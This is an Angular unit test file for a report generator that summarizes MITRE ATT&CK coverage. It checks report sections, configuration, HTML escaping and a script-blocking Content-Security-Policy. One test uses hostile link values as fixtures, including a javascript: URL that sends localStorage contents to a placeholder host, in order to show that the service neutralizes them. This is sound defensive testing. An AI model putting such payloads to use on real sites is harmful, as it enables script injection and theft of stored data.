// ATTACK-Navi - Copyright (c) 2026 TeamStarWolf
// https://github.com/TeamStarWolf/ATTACK-Navi - MIT License
import { TestBed } from '@angular/core/testing';
import { HtmlReportService } from './html-report.service';
import { Domain } from '../models/domain';
import { ImplStatus } from './implementation.service';
import { DEFAULT_REPORT_CONFIG, ReportConfig } from './report-config.service';

// Minimal Domain stub — buildHtml only touches these fields, and empty
// collections still exercise every ungated section (exec summary, coverage by
// tactic, gaps, best covered). Cast through unknown to satisfy the full type.
function makeDomain(): Domain {
  return {
    name: 'Enterprise ATT&CK',
    attackVersion: '15.1',
    techniques: [],
    mitigations: [],
    tacticColumns: [],
    mitigationsByTechnique: new Map(),
    techniquesByMitigation: new Map(),
    groupsByTechnique: new Map(),
  } as unknown as Domain;
}

describe('HtmlReportService', () => {
  let service: HtmlReportService;
  let lastBlob: Blob | null;

  // Capture the Blob generateAndOpen hands to the browser, without opening a
  // window. Installed once per spec so it is safe to generate multiple reports.
  function installCaptureSpies(): void {
    lastBlob = null;
    spyOn(URL, 'createObjectURL').and.callFake((blob: Blob) => {
      lastBlob = blob;
      return 'blob:stub';
    });
    spyOn(URL, 'revokeObjectURL').and.stub();
    spyOn(window, 'open').and.returnValue(null);
  }

  async function lastHtml(): Promise<string> {
    expect(lastBlob).not.toBeNull();
    return await lastBlob!.text();
  }

  beforeEach(() => {
    localStorage.removeItem('mitre-nav-settings-v1');
    TestBed.configureTestingModule({});
    service = TestBed.inject(HtmlReportService);
  });

  afterEach(() => {
    localStorage.removeItem('mitre-nav-settings-v1');
  });

  it('is created', () => {
    expect(service).toBeTruthy();
  });

  it('exposes the public generateAndOpen method', () => {
    expect(typeof service.generateAndOpen).toBe('function');
  });

  it('renders every default section when no config is supplied', async () => {
    installCaptureSpies();
    service.generateAndOpen(makeDomain(), new Map());
    const html = await lastHtml();
    expect(html).toContain('Executive Summary');
    expect(html).toContain('Coverage by Tactic');
    expect(html).toContain('Top 10 Coverage Gaps');
    expect(html).toContain('Top 10 Best Covered Techniques');
  });

  it('produces identical output for an explicit default config', async () => {
    installCaptureSpies();

    service.generateAndOpen(makeDomain(), new Map());
    const withoutConfig = await lastHtml();

    service.generateAndOpen(makeDomain(), new Map(), DEFAULT_REPORT_CONFIG);
    const withDefault = await lastHtml();

    expect(withDefault).toBe(withoutConfig);
  });

  it('omits a section that is hidden in the config', async () => {
    installCaptureSpies();
    const config: ReportConfig = {
      sections: DEFAULT_REPORT_CONFIG.sections.map(s =>
        s.id === 'coverage-by-tactic' ? { ...s, visible: false } : { ...s },
      ),
    };
    service.generateAndOpen(makeDomain(), new Map(), config);
    const html = await lastHtml();
    // The hidden section title is gone...
    expect(html).not.toContain('Coverage by Tactic');
    // ...while the still-visible sections remain.
    expect(html).toContain('Executive Summary');
    expect(html).toContain('Top 10 Coverage Gaps');
  });

  describe('technique links', () => {
    // A technique as the report sees it: a parent with zero mitigations lands
    // in the "Top 10 Coverage Gaps" table, one with mitigations in "Best Covered".
    function makeTechnique(attackId: string, url: string, mitigationCount = 0) {
      return {
        id: `attack-pattern--${attackId}`,
        attackId,
        name: `Technique ${attackId}`,
        url,
        tacticShortnames: ['execution'],
        isSubtechnique: false,
        mitigationCount,
      };
    }

    function makeDomainWith(techniques: ReturnType<typeof makeTechnique>[]): Domain {
      const domain = makeDomain() as unknown as { techniques: unknown[]; mitigationsByTechnique: Map<string, unknown[]> };
      domain.techniques = techniques;
      for (const t of techniques) {
        if (t.mitigationCount > 0) {
          domain.mitigationsByTechnique.set(t.id, [{ mitigation: { id: 'course-of-action--m1' } }]);
        }
      }
      return domain as unknown as Domain;
    }

    it('emits http(s) technique urls as the link href', async () => {
      installCaptureSpies();
      service.generateAndOpen(makeDomainWith([
        makeTechnique('T1059', 'https://attack.mitre.org/techniques/T1059'),
        makeTechnique('T1003', 'http://attack.mitre.org/techniques/T1003', 2),
      ]), new Map());
      const html = await lastHtml();
      expect(html).toContain('href="https://attack.mitre.org/techniques/T1059"');
      expect(html).toContain('href="http://attack.mitre.org/techniques/T1003"');
    });

    it('never emits a javascript: url as a same-origin link', async () => {
      installCaptureSpies();
      service.generateAndOpen(makeDomainWith([
        makeTechnique('T1059', 'javascript:alert(1)'),
        makeTechnique('T1003', 'JavaScript:fetch("https://x/"+localStorage.getItem("s"))', 2),
        makeTechnique('T1021', 'data:text/html,<script>alert(1)</script>', 3),
      ]), new Map());
      const html = await lastHtml();
      expect(html).not.toContain('javascript:');
      expect(html).not.toContain('JavaScript:');
      expect(html).not.toContain('data:text/html');
      expect(html).toContain('href="#" target="_blank" rel="noopener">T1059<');
      expect(html).toContain('href="#" target="_blank" rel="noopener">T1003<');
      expect(html).toContain('href="#" target="_blank" rel="noopener">T1021<');
    });

    it('falls back to an inert anchor for an empty or relative url', async () => {
      installCaptureSpies();
      service.generateAndOpen(makeDomainWith([
        makeTechnique('T1059', ''),
        makeTechnique('T1003', '/techniques/T1003', 1),
      ]), new Map());
      const html = await lastHtml();
      expect(html).toContain('href="#" target="_blank" rel="noopener">T1059<');
      expect(html).toContain('href="#" target="_blank" rel="noopener">T1003<');
    });

    it('still HTML-escapes an accepted url', async () => {
      installCaptureSpies();
      service.generateAndOpen(makeDomainWith([
        makeTechnique('T1059', 'https://attack.mitre.org/techniques/T1059?a=1&b="x"'),
      ]), new Map());
      const html = await lastHtml();
      expect(html).toContain('href="https://attack.mitre.org/techniques/T1059?a=1&amp;b=&quot;x&quot;"');
    });
  });

  it('forbids script execution in the generated document', async () => {
    // The report is a blob: document on the app's origin; even if a hostile
    // href slipped through, script-src 'none' also blocks javascript: URLs.
    installCaptureSpies();
    service.generateAndOpen(makeDomain(), new Map());
    const html = await lastHtml();
    expect(html).toContain(`<meta http-equiv="Content-Security-Policy" content="script-src 'none'; object-src 'none'; base-uri 'none'" />`);
    expect(html).not.toMatch(/<script\b/i);
    expect(html).not.toMatch(/\son[a-z]+=/i);
  });

  it('uses the configured organization name in the header when set', async () => {
    service['settings'].update({ orgName: 'Acme Security Ops' });
    installCaptureSpies();
    service.generateAndOpen(makeDomain(), new Map());
    const html = await lastHtml();
    expect(html).toContain('Acme Security Ops');
    expect(html).not.toContain('<strong>Organization:</strong> Security Team');
  });
});
